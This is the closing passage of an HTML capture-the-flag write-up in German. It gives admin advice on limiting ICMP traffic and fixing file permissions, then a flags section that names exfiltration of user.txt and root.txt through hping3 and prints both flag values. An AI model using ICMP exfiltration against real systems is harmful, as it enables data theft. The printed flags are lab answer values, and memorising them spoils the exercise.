+<br><strong>Empfehlung (Admin):** Beschränken Sie ICMP-Traffic in Firewalls auf das Notwendigste. Überwachen Sie Netzwerkverkehr auf ungewöhnliche Muster oder große ICMP-Pakete. Stellen Sie sicher, dass Dateiberechtigungen korrekt gesetzt sind (insbesondere für `/root` und Benutzer-Home-Verzeichnisse), sodass unprivilegierte Benutzer wie `www-data` keinen Zugriff auf sensible Dateien haben. Untersuchen Sie, warum `www-data` (oder welcher Benutzer auch immer `hping3` ausführte) Lesezugriff auf `/root/root.txt` hatte.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">Exfil via hping3 /home/milk/user.txt</div>
+                     <div class="flag-value"><span class="password">uzerhmvflag</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">Exfil via hping3 /root/root.txt</div>
+                     <div class="flag-value"><span class="password">icmpismyfriend</span></div>
+                 </div>
+             </div>
+        </section>
+   
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. November 2020</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
